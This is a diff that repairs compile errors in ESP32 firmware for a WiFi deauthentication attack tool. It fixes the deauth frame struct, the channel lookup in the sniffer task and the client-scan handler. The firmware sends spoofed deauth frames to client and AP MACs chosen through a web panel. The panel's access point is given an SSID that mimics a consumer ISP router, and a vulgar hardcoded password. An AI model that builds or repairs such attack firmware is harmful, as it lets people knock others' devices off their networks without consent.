@@ -12,8 +12,8 @@
 extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 // --- Configuration ---
-const char* AP_SSID = "PLDTHOMEFIBR8266"; // SSID for the ESP32's control panel
-const char* AP_PASSWORD = "@Suckmydick"; // Password for the control panel
+const char* AP_SSID = "PLDTHOMEFIBR8080KA"; // SSID for the ESP32's control panel
+const char* AP_PASSWORD = "$@Suckmydick"; // Password for the control panel
 const int AP_CHANNEL = 6; // Fixed channel for the control AP
 
 // --- 802.11 Frame Structures ---
@@ -24,7 +24,7 @@ typedef struct {
     uint8_t addr1[6]; // DA (Destination Address - Client)
     uint8_t addr2[6]; // SA (Source Address - AP)
     uint8_t addr3[6]; // BSSID (AP MAC)
-    uint1_t_t seq_ctrl;
+    uint16_t seq_ctrl; // CORRECTED: Was uint1_t_t
     uint16_t reason_code;
 } deauth_frame_t;
 
@@ -485,7 +485,11 @@ void snifferControlTask(void *pvParameters) {
              // If not hopping, ensure it's on a default channel or last used attack channel
              // For now, let it sit on the last channel if hopping is disabled.
              // Or, set to a fixed channel, e.g. AP_CHANNEL.
-             if (esp_wifi_get_channel() != global_sniffer_channel) { // ensure it's on selected channel if not hopping
+             // CORRECTED: esp_wifi_get_channel() usage
+             uint8_t primary_channel;
+             wifi_second_chan_t second_channel;
+             esp_err_t err = esp_wifi_get_channel(&primary_channel, &second_channel);
+             if (err == ESP_OK && primary_channel != global_sniffer_channel) { // ensure it's on selected channel if not hopping
                 esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
              }
             vTaskDelay(pdMS_TO_TICKS(1000)); // Check less frequently
@@ -512,7 +516,7 @@ void sendDeauthFrame(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t c
     memcpy(deauth_pkt.addr1, client_mac, 6); // DA (Client)
     memcpy(deauth_pkt.addr2, ap_mac, 6);     // SA (AP)
     memcpy(deauth_pkt.addr3, ap_mac, 6);     // BSSID (AP)
-    deauth_pkt.seq_ctrl = 0; // Can be incremented
+    deauth_pkt.seq_ctrl = 0; // Can be incremented // This line is now valid due to struct correction
     deauth_pkt.reason_code = 0x0001; // 1 = Unspecified reason
 
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
@@ -633,9 +637,8 @@ void handleScanClients(AsyncWebServerRequest *request) {
     // Create a copy for safe iteration if sniffer task modifies it
     std::vector<DeviceInfo> current_clients_copy;
     // Basic lock mechanism (not true mutex, but good enough for simple case if reads are quick)
-    portENTER_CRITICAL(&mux); // Example, declare esp_mux_t mux globally if using. Simpler: just copy.
+    // CORRECTED: Removed portENTER_CRITICAL and portEXIT_CRITICAL
     current_clients_copy = scanned_clients;
-    portEXIT_CRITICAL(&mux);  // Example
     
     for (size_t i = 0; i < current_clients_copy.size(); ++i) {
         json += "{";
@@ -673,7 +676,7 @@ void handleAttack(AsyncWebServerRequest *request) {
                 current_ap_mac = request->getParam("ap_mac")->value();
                 attack_channel = request->getParam("channel")->value().toInt();
 
-                if (attack_channel < 1 || attack_channel > 13) {
+                if (attack_channel < 1 || attack_channel > 13) { // Common channel range, adjust if needed for other regions
                     request->send(400, "text/plain", "Invalid channel.");
                     current_attack_type = "None";
                     return;
